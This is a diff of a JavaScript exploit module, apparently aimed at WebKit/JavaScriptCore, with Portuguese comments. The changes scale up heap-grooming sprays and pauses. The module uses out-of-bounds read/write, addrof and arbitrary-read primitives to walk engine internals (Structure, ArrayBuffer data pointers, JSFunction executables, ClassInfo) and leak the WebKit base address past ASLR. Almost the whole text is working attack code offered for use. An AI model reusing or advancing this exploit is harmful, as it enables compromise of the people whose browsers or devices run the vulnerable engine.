@@ -1,17 +1,20 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R82 - Super Agressivo Heap Grooming & Análise de Padrões)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R83 - Final Assault on Heap Poisoning & Smart Scan)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. OOB/L/E Funcional: As primitivas básicas de exploração estão estáveis.
 // 2. Poluição de Heap Persistente: O valor 0xdeadbeef_cafebabe continua a sobrepor
 //    ponteiros críticos no heap, impedindo vazamentos de endereço base.
-// 3. Heap Grooming Extremo: Aumentado o volume e diversidade de objetos, com múltiplos
-//    ciclos de spray/liberação e pausas mais longas para forçar o alocador de heap.
-//    Adicionada a função `getSafeOffset` para acesso robusto a offsets.
-// 4. Vazamentos Alternativos: Tentativas de vazar ponteiros de TypedArrays e JSCFunctions.
-//    Adição de tentativa de vazamento por varredura de memória adjacente a valores conhecidos.
+// 3. Heap Grooming EXTREMO E DIVERSIFICADO: Aumentado drasticamente o volume,
+//    diversidade e ciclos de spray/liberação, com pausas mais longas.
+//    Objetivo: forçar a reciclagem de heap para obter memória *não* poluída.
+// 4. Vazamentos Aprimorados:
+//    - Vazamento de ponteiros TypedArrays e JSCFunctions (revisados).
+//    - NOVO FOCO: Vazamento por Varredura de Memória Adjancente a valores controlados.
+//      Esta é a aposta principal para contornar o poisoning direto de ponteiros.
 //
-// DIAGNÓSTICO: A poluição é o principal obstáculo. Estratégias mais agressivas de
-//              heap grooming e análise de padrões de memória são cruciais.
+// DIAGNÓSTICO: A poluição é o principal obstáculo. Essa versão é uma tentativa final
+//              via JavaScript para contornar o poisoning através de força bruta
+//              de grooming e análise inteligente da memória.
 //
 // ATENÇÃO: A PRIMITIVA DE L/E É SUCESSO. A FALHA NO VAZAMENTO É DEVIDO AO HEAP LAYOUT/GC.
 // =======================================================================================
@@ -25,7 +28,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R82_SuperAggroGrooming";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R83_FinalAssault";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -55,7 +58,6 @@ function getSafeOffset(baseObject, path, defaultValue = 0) {
         if (current && typeof current === 'object' && part in current) {
             current = current[part];
         } else {
-            // Este alerta indica que o offset não foi encontrado ou é undefined
             logS3(`ALERTA: Caminho de offset "${path}" parte "${fullPath}" é undefined. Usando valor padrão ${defaultValue}.`, "warn");
             return defaultValue;
         }
@@ -63,7 +65,6 @@ function getSafeOffset(baseObject, path, defaultValue = 0) {
     if (typeof current === 'number') {
         return current;
     }
-    // Se o offset é uma string hex, tenta converter
     if (typeof current === 'string' && String(current).startsWith('0x')) {
         return parseInt(String(current), 16) || defaultValue;
     }
@@ -90,25 +91,25 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     try {
         // Pausa extra no início para garantir que todos os imports/offsets estejam carregados
         logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
-        await PAUSE_S3(1000); // 1 segundo de pausa
+        await PAUSE_S3(2000); // Aumentado para 2 segundos
 
         // Armazenar offsets críticos em constantes locais para garantir disponibilidade
         const LOCAL_JSC_OFFSETS = {
-            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'), // 
-            JSCell_STRUCTURE_ID_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_ID_FLATTENED_OFFSET'), // 
-            JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET'), // 
-            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'), // 
-            Structure_CLASS_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.CLASS_INFO_OFFSET'), // 
-            Structure_GLOBAL_OBJECT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.GLOBAL_OBJECT_OFFSET'), // 
-            Structure_PROTOTYPE_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.PROTOTYPE_OFFSET'), // 
-            Structure_AGGREGATED_FLAGS_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.AGGREGATED_FLAGS_OFFSET'), // 
-            Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET'), // 
-            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'), // 
-            ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'), // 
-            ArrayBufferView_M_VECTOR_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_VECTOR_OFFSET'), // 
-            ArrayBuffer_DATA_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'), // 
-            JSFunction_EXECUTABLE_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSFunction.EXECUTABLE_OFFSET'), // 
-            ClassInfo_M_CACHED_TYPE_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'ClassInfo.M_CACHED_TYPE_INFO_OFFSET', 0x8), // Assume 0x8, validar com binários. 
+            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
+            JSCell_STRUCTURE_ID_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_ID_FLATTENED_OFFSET'),
+            JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET'),
+            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
+            Structure_CLASS_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.CLASS_INFO_OFFSET'),
+            Structure_GLOBAL_OBJECT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.GLOBAL_OBJECT_OFFSET'),
+            Structure_PROTOTYPE_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.PROTOTYPE_OFFSET'),
+            Structure_AGGREGATED_FLAGS_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.AGGREGATED_FLAGS_OFFSET'),
+            Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET'),
+            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
+            ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'),
+            ArrayBufferView_M_VECTOR_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_VECTOR_OFFSET'),
+            ArrayBuffer_DATA_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'),
+            JSFunction_EXECUTABLE_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSFunction.EXECUTABLE_OFFSET'),
+            ClassInfo_M_CACHED_TYPE_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'ClassInfo.M_CACHED_TYPE_INFO_OFFSET', 0x8),
         };
 
         // Adicionar uma verificação de sanidade para os offsets críticos logo após carregá-los
@@ -124,7 +125,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             'Structure_VIRTUAL_PUT_OFFSET'
         ];
         for (const offsetName of mandatoryOffsets) {
-            if (LOCAL_JSC_OFFSETS[offsetName] === 0) { // Um offset 0 é considerado inválido para estes campos
+            if (LOCAL_JSC_OFFSETS[offsetName] === 0) {
                 logS3(`ERRO CRÍTICO: Offset mandatório '${offsetName}' é 0. Isso indica falha na recuperação do offset.`, "critical");
                 throw new Error(`Offset mandatório '${offsetName}' é 0. Abortando.`);
             }
@@ -141,9 +142,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("OOB DataView obtido com sucesso.", "info");
 
         // --- VERIFICAÇÃO: OOB DataView m_length ---
-        // offset 0x70 é o offset absoluto do m_length na OOB buffer, conforme logs do CoreExploit.
-        // (0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER) + ArrayBufferView.M_LENGTH_OFFSET (0x18))
-        const OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE = 0x58 + LOCAL_JSC_OFFSETS.ArrayBufferView_M_LENGTH_OFFSET; 
+        const OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE = 0x58 + LOCAL_JSC_OFFSETS.ArrayBufferView_M_LENGTH_OFFSET;
         
         const oob_dv = getOOBDataView();
         const oob_m_length_val = oob_dv.getUint32(OOB_DV_M_LENGTH_ACTUAL_OFFSET_IN_CORE, true);
@@ -247,58 +246,52 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
         logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---", "subtest");
         
-        // ** Heap Grooming Mais Agressivo e com Fillers **
-        logS3("  Executando Heap Grooming agressivo com fillers para tentar limpar e organizar o heap...", "info");
+        // ** Heap Grooming Super Agressivo e com Fillers **
+        logS3("  Executando Heap Grooming super agressivo com fillers para tentar limpar e organizar o heap...", "info");
         let aggressive_feng_shui_objects = [];
         let filler_objects = [];
-        const NUM_GROOMING_OBJECTS = 200000; // Aumentado para 200K
-        const NUM_FILLER_OBJECTS = 50000;    // Aumentado para 50K
+        const NUM_GROOMING_OBJECTS_LARGE = 300000; // Aumentado para 300K
+        const NUM_FILLER_OBJECTS_LARGE = 100000;    // Aumentado para 100K
 
-        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) {
-            aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); // Arrays diversos
-            aggressive_feng_shui_objects.push({}); // Objetos simples
-            aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); // Strings mais longas
-            aggressive_feng_shui_objects.push(new Date()); // Outros tipos
-            aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); // TypedArrays maiores
-            aggressive_feng_shui_objects.push(new RegExp(".*")); // Objetos complexos
+        for (let i = 0; i < NUM_GROOMING_OBJECTS_LARGE; i++) {
+            aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10));
+            aggressive_feng_shui_objects.push({});
+            aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10)));
+            aggressive_feng_shui_objects.push(new Date());
+            aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 200) + 5));
+            aggressive_feng_shui_objects.push(new RegExp(".*"));
             aggressive_feng_shui_objects.push(new Map());
             aggressive_feng_shui_objects.push(new Set());
-            aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 2048) + 64)); // ArrayBuffers de até 2KB + 64 bytes
-            // Adicionar mais variedade de tipos primitivos/wrappers
+            aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 4096) + 64)); // ArrayBuffers maiores (até 4KB)
             aggressive_feng_shui_objects.push(new Number(i));
             aggressive_feng_shui_objects.push(new Boolean(i % 2 === 0));
         }
-        logS3(`  Primeiro spray de ${NUM_GROOMING_OBJECTS} objetos.`, "debug");
+        logS3(`  Primeiro spray de ${NUM_GROOMING_OBJECTS_LARGE} objetos.`, "debug");
 
-        // Liberar metade para criar buracos
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
             aggressive_feng_shui_objects[i] = null;
         }
         logS3(`  Metade dos objetos do primeiro spray liberados.`, "debug");
 
-        // Criar objetos "filler" para preencher buracos com dados conhecidos
-        for (let i = 0; i < NUM_FILLER_OBJECTS; i++) {
-            filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) });
+        for (let i = 0; i < NUM_FILLER_OBJECTS_LARGE; i++) {
+            filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER_G".repeat(Math.floor(Math.random() * 5) + 1) });
         }
-        logS3(`  Spray de ${NUM_FILLER_OBJECTS} fillers concluído.`, "debug");
+        logS3(`  Spray de ${NUM_FILLER_OBJECTS_LARGE} fillers concluído.`, "debug");
 
-        // Forçar uma coleta de lixo, se possível, liberando referências principais
         aggressive_feng_shui_objects.length = 0;
         aggressive_feng_shui_objects = null;
         logS3(`  Referências principais para grooming liberadas.`, "debug");
 
-        await PAUSE_S3(15000); // Pausa ainda maior (15 segundos)
+        await PAUSE_S3(20000); // Pausa muito maior (20 segundos)
 
-        // Adicional: Mais um ciclo de alocação/desalocação para agitar o heap novamente
         let secondary_grooming_objects = [];
-        const NUM_SECONDARY_GROOMING = 75000; // Aumentado
+        const NUM_SECONDARY_GROOMING = 100000; // Aumentado
         for (let i = 0; i < NUM_SECONDARY_GROOMING; i++) {
-            secondary_grooming_objects.push(new Uint8Array(Math.floor(Math.random() * 256) + 32)); // Pequenos TypedArrays
-            if (i % 7500 === 0) secondary_grooming_objects.push({}); // Objetos simples periodicamente
+            secondary_grooming_objects.push(new Uint8Array(Math.floor(Math.random() * 512) + 32)); // Pequenos TypedArrays maiores
+            if (i % 10000 === 0) secondary_grooming_objects.push({});
         }
         logS3(`  Segundo spray de ${NUM_SECONDARY_GROOMING} objetos para agitação.`, "debug");
         
-        // Liberar novamente para criar mais churn
         for (let i = 0; i < NUM_SECONDARY_GROOMING; i += 2) {
             secondary_grooming_objects[i] = null;
         }
@@ -306,12 +299,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         secondary_grooming_objects = null;
         logS3(`  Referências do segundo spray liberadas.`, "debug");
 
-        await PAUSE_S3(10000); // Pausa final após segundo grooming
+        await PAUSE_S3(15000); // Pausa final após segundo grooming
 
         logS3(`  Heap Grooming concluído. Pausa finalizada.`, "debug");
 
         // --- TENTATIVAS DE VAZAMENTO ---
-        // 1. TENTATIVA DE VAZAMENTO: Objeto JS Simples ({}).
+
+        // 1. TENTATIVA DE VAZAMENTO: Objeto JS Simples ({}) - Vazamento de Structure*
         logS3("  Tentando vazamento com Objeto JS Simples ({}) - grooming reforçado...", "info");
         const obj_for_webkit_leak_js = {};
         const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
@@ -328,16 +322,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure*
         logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info");
-        // Re-executar o grooming mais agressivo antes de cada tentativa de vazamento
         let aggressive_feng_shui_objects_re = [];
         let filler_objects_re = [];
-        const RE_NUM_GROOMING = 50000; // menor para cada repetição
-        const RE_NUM_FILLERS = 10000;
-        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
+        const RE_NUM_GROOMING = 75000;
+        const RE_NUM_FILLERS = 15000;
+        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 4096) + 64)); }
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
-        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
+        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER_R".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(15000); // Pausa longa
+        await PAUSE_S3(20000);
         logS3("  Grooming de repetição concluído.", "debug");
 
         logS3("  Tentando vazamento com ArrayBuffer (Structure* via grooming reforçado)...", "info");
@@ -357,11 +350,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 3. TENTATIVA DE VAZAMENTO: TypedArray Data Pointer (ArrayBufferView `data` field)
         logS3("  Executando Heap Grooming novamente antes de tentar TypedArray Data Pointer...", "info");
         aggressive_feng_shui_objects_re = []; filler_objects_re = [];
-        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
+        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 4096) + 64)); }
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
-        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
+        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER_R".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(15000);
+        await PAUSE_S3(20000);
 
         logS3("  Tentando vazamento do Data Pointer de um TypedArray...", "info");
         const typed_array_victim = new Uint32Array(0x1000 / 4);
@@ -372,7 +365,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3("    Addrof retornou 0 ou NaN para TypedArray. Pulando tentativa de vazamento do data pointer.", "error");
         } else {
             try {
-                const M_BUFFER_OFFSET = LOCAL_JSC_OFFSETS.ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET; // Usar ASSOCIATED_ARRAYBUFFER_OFFSET 
+                const M_BUFFER_OFFSET = LOCAL_JSC_OFFSETS.ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET;
                 const array_buffer_obj_addr = arb_read_final(typed_array_addr.add(M_BUFFER_OFFSET));
                 logS3(`    Lido ArrayBuffer* (m_buffer) de TypedArray (${toHex(M_BUFFER_OFFSET)}): ${array_buffer_obj_addr.toString(true)}`, "leak");
 
@@ -384,7 +377,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     throw new Error("Falha ao vazar ArrayBuffer* do TypedArray (endereço é 0x0 ou NaN).");
                 }
                 
-                const M_DATA_OFFSET = LOCAL_JSC_OFFSETS.ArrayBuffer_DATA_POINTER_OFFSET; // Usar DATA_POINTER_COPY_OFFSET 
+                const M_DATA_OFFSET = LOCAL_JSC_OFFSETS.ArrayBuffer_DATA_POINTER_OFFSET;
                 const data_ptr_addr = array_buffer_obj_addr.add(M_DATA_OFFSET);
                 const actual_data_ptr = arb_read_final(data_ptr_addr);
                 logS3(`    Lido Ponteiro de Dados (m_data) do ArrayBuffer (${toHex(M_DATA_OFFSET)}): ${actual_data_ptr.toString(true)}`, "leak");
@@ -418,11 +411,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 4. TENTATIVA DE VAZAMENTO: Endereço de uma JSCFunction (Função JS Nativga)
         logS3("  Executando Heap Grooming novamente antes de tentar JSCFunction...", "info");
         aggressive_feng_shui_objects_re = []; filler_objects_re = [];
-        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
+        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 4096) + 64)); }
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
-        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
+        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER_R".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(15000);
+        await PAUSE_S3(20000);
         
         logS3("  Tentando vazamento do endereço de uma JSCFunction (e.g., Math.cos)...", "info");
         try {
@@ -438,7 +431,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Falha ao vazar Math.cos (endereço é 0x0 ou NaN).");
             }
 
-            const EXECUTABLE_OFFSET = LOCAL_JSC_OFFSETS.JSFunction_EXECUTABLE_OFFSET; // 
+            const EXECUTABLE_OFFSET = LOCAL_JSC_OFFSETS.JSFunction_EXECUTABLE_OFFSET;
             if (EXECUTABLE_OFFSET) {
                  const executable_addr = arb_read_final(func_addr.add(EXECUTABLE_OFFSET));
                  logS3(`    Lido Executable* (${toHex(EXECUTABLE_OFFSET)}) de Math.cos: ${executable_addr.toString(true)}`, "leak");
@@ -469,11 +462,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // 5. NOVA TENTATIVA DE VAZAMENTO: JSC::ClassInfo::m_cachedTypeInfo
         logS3("  Executando Heap Grooming novamente antes de tentar JSC::ClassInfo::m_cachedTypeInfo...", "info");
         aggressive_feng_shui_objects_re = []; filler_objects_re = [];
-        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 1024) + 64)); }
+        for (let i = 0; i < RE_NUM_GROOMING; i++) { aggressive_feng_shui_objects_re.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects_re.push({}); aggressive_feng_shui_objects_re.push(new String("A".repeat(Math.floor(Math.random() * 250) + 10))); aggressive_feng_shui_objects_re.push(new Date()); aggressive_feng_shui_objects_re.push(new Uint32Array(Math.floor(Math.random() * 200) + 5)); aggressive_feng_shui_objects_re.push(new RegExp(".*")); aggressive_feng_shui_objects_re.push(new Map()); aggressive_feng_shui_objects_re.push(new Set()); aggressive_feng_shui_objects_re.push(new ArrayBuffer(Math.floor(Math.random() * 4096) + 64)); }
         for (let i = 0; i < aggressive_feng_shui_objects_re.length; i += 2) { aggressive_feng_shui_objects_re[i] = null; }
-        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER".repeat(Math.floor(Math.random() * 5) + 1) }); }
+        for (let i = 0; i < RE_NUM_FILLERS; i++) { filler_objects_re.push({ filler_val: 0xCCCCCCCC, filler_id: i, filler_str: "FILLER_R".repeat(Math.floor(Math.random() * 5) + 1) }); }
         aggressive_feng_shui_objects_re.length = 0; aggressive_feng_shui_objects_re = null;
-        await PAUSE_S3(15000);
+        await PAUSE_S3(20000);
 
         logS3("  Tentando vazamento via JSC::ClassInfo::m_cachedTypeInfo...", "info");
         try {
@@ -481,7 +474,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const target_obj_addr = addrof(target_obj);
             logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");
 
-            const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET; // 
+            const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
             const structure_ptr_addr = target_obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
             const structure_addr = arb_read_final(structure_ptr_addr);
             if (structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
@@ -489,7 +482,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             logS3(`    Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");
 
-            const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET; // 
+            const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
             const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
             const class_info_addr = arb_read_final(class_info_ptr_addr);
             if (class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
@@ -497,7 +490,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");
 
-            const M_CACHED_TYPE_INFO_OFFSET = LOCAL_JSC_OFFSETS.ClassInfo_M_CACHED_TYPE_INFO_OFFSET; // 
+            const M_CACHED_TYPE_INFO_OFFSET = LOCAL_JSC_OFFSETS.ClassInfo_M_CACHED_TYPE_INFO_OFFSET;
